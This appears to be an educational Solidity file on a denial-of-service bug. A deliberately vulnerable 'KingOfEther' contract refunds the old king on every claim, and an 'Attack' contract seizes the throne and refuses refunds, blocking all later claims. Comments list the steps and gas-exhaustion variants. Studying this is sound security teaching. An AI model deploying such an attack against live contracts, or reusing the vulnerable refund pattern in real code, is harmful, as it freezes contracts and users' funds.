// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;
import "./console.sol";

/*
The goal of KingOfEther is to become the king by sending more Ether than
the previous king. Previous king will be refunded with the amount of Ether
he sent.
*/

/*
1. Deploy KingOfEther
2. Alice becomes the king by sending 1 Ether to claimThrone().
2. Bob becomes the king by sending 2 Ether to claimThrone().
   Alice receives a refund of 1 Ether.
3. Deploy Attack with address of KingOfEther.
4. Call attack with 3 Ether.
5. Current king is the Attack contract and no one can become the new king.

What happened?
Attack became the king. All new challenge to claim the throne will be rejected
since Attack contract does not have a fallback function, denying to accept the
Ether sent from KingOfEther before the new king is set.
*/

contract KingOfEther {
    address public king;
    uint256 public bal;

    function claimThrone() external payable {
        require(msg.value > bal, "Need to pay more to become the king");
        console.log("claimThrone(), refund old king %s with bal %d", king, bal);
        (bool sent, ) = king.call{value: bal}("");
        // even if we comment the require(sent), the old king cannot be refunded
        // as there is no payable fallback or receive function
        require(sent, "Failed to send Ether");

        bal = msg.value;
        king = msg.sender;
        console.log("claimThrone(), new king is %s, bal is %d", king, bal);
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // You can also perform a DOS by consuming all gas using assert.
    // This attack will work even if the calling contract does not check
    // whether the call was successful or not.
    //
    // function () external payable {
    //     assert(false);
    // }
    //fallback() external payable {
    //    assert(false);
    //}

    // receive() external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
